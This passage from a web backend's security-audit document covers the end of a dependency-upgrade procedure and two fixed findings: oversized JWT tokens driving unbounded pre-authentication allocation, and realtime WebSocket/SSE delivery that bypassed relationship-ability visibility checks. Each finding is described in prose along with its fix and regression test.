     release (headers + `.c`). The version surfaces update automatically — `build.zig` reads the
     new `#define` from the header; there is nothing else to edit for the version string.
   - *zap:* re-pin it in `build.zig.zon` (url + hash), then update the curated `zap_version`
     constant in `build.zig` (and the mirror in `scripts/audit-deps.sh`) to match. If the new `zap`
     bundles a different facil.io, **also bump the curated `facil_version` constant** in `build.zig`
     and `scripts/audit-deps.sh`.
2. **Record the advisory (if it now applies to a range you shipped).** Add a row to
   `docs/security-advisories.md` with the affected range and the fixed-in `Min safe version`.
3. **Run `zig build audit`** and confirm it exits 0 (all pins clear). If it reports AFFECTED, the
   bump is incomplete — finish the upgrade until it is clean.
4. **Rebuild and verify** with `zig build versions` that the new versions are what you expect.
5. **Add a changelog fragment** under `changelog.d/` with a `### Security` bullet describing the
   dependency bump and the CVE(s) it addresses.
6. **Release** per `scripts/release.sh` (the fragment is assembled into the changelog).

### F13 — Unbounded pre-auth allocation from attacker-supplied JWT length (FIXED)

**Where.** `src/jwt.zig` (`verify`, `peekClaims`, `sign`).

**Description.** No code path bounded the length of a supplied token before decoding it.
Token extraction is verbatim at every entry point — `src/http.zig` (`bearerToken`, `cookie`),
`src/api/files.zig` (`token` query param), `src/realtime/protocol.zig` (`token` JSON field) —
and the only limits were transport-level and uneven: header/query paths are incidentally
capped near 8 KB by facil.io's `HTTP_MAX_HEADER_LENGTH`, but a request **body** may be
`max_upload_size` (50 MiB by default, `src/config.zig`) and a realtime frame 256 KiB.

Because a token is base64-decoded and JSON-parsed **before** its signature is checked, an
unauthenticated request could drive allocation proportional to the bytes it supplied. A
1,048,618-byte garbage token was measured consuming 1,048,616 bytes before rejection. All
production call sites used the arena-scoped `verify`/`peekClaims`, so the allocation landed
on the request arena and was held for the request's lifetime.

**Fix.** `verify` and `peekClaims` reject `token.len > jwt.max_token_len` (4096) as their
first statement, before any allocation. The check is inside those two functions rather than
in the `verifyInto`/`peekClaimsInto` wrappers deliberately: the wrappers had *zero*
production callers, so bounding only them would have left every real path unbounded.
`sign` enforces the same ceiling so the module cannot mint a token it would refuse.

**Not a full DoS fix on its own.** This bounds per-token amplification, not request volume;
the rate limiter (F8) and body-size limits remain the controls for that.

### F14 — Relationship abilities bypassed on realtime delivery (FIXED)

**Where.** `src/realtime/hub.zig` (`shouldDeliver`).

**Description.** A collection's row-level visibility can be narrowed below its access *rule*
by a relationship **ability** (`App(.{ .abilities = .{ .<col> = .{ .view = … } } })`) — the
documented guarantee (`docs/abilities.md`) is that effective visibility is `(rule) AND
(ability) AND (tenant)`, and that this "includes realtime delivery." The REST list/read paths
enforce it through `policy.matchesRule`, which AND-s the compiled ability predicate into the
guard stack.

`shouldDeliver` did not. Its fast paths early-returned "deliver" whenever the access rule was
`@public` (or a delete was rule-allowed) **and** `tenancy.scopeApplies` was false — consulting
only the *tenant* constraint, never the *ability*. So a collection that is `@public` for the
view rule but visibility-narrowed by a `view` ability delivered every created/updated/deleted
record to **every** subscriber over WebSocket/SSE, regardless of whether the subscriber held a
qualifying membership. A non-member subscribing to the collection received rows it could never
read over REST — an authorization bypass on the realtime channel.

**Fix.** Introduced `policy.rowConstrained(col, action, rctx)` =
`abilities.abilityApplies(abilityFor(col, action), rctx) or tenancy.scopeApplies(col, rctx)`
— the exact condition `policy.decide` already uses to decide whether a row needs per-record
checking. `shouldDeliver` now gates its fast-path early-returns on `rowConstrained` instead of
`scopeApplies` alone, so any ability-constrained collection falls through to the per-record
`matchesRule` evaluation (which composes the ability predicate) exactly like the REST path.
Deriving both call sites from one shared predicate makes the realtime and REST authorization
drift-proof: a future ability kind wires into both at once. Regression test in
`src/realtime/hub.zig` ("@public viewRule + view ability: create is NOT delivered to a
non-member") proves the empty-qualifying-set case is denied and superusers still receive it.
